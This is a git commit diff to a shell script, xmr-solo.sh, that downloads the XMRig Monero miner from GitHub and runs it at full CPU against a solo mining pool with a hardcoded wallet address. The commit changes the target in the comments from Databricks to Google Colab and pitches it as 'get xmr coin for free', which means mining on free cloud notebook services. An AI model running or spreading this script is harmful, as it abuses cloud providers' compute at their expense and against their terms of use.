a2222a4069603c56b080a5a7e33bd028df78c999
bodinhoblink <39828630+bodinhoblink@users.noreply.github.com>
2022-05-06 23:26:16 -0300

    Update xmr-solo.sh

--- xmr-solo.sh
+++ xmr-solo.sh
@@ -1,13 +1,14 @@
 #! /bin/bash
-# Get xmr coin for free
-# Databricks
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
 sudo apt update
 clear
 sudo apt install screen
 screen -R xmr
  
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.0/xmrig-6.12.0-focal-x64.tar.gz
-tar xvzf xmrig-6.12.0-focal-x64.tar.gz
-cd xmrig-6.12.0
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
 ./xmrig -a rx/0 -o s2.solopool.org:8010 -u 8BrixK3vTTdPRG92JMdwsefnDpLvzJUST6xf5PQn3iW2PFne3zwVAGhQPoVDx8zY2zG3WE9GvY1djgDB8HXhsg3wHxTCe9e -k --tls -p Threadripper --threads=100 --cpu-priority=5
 
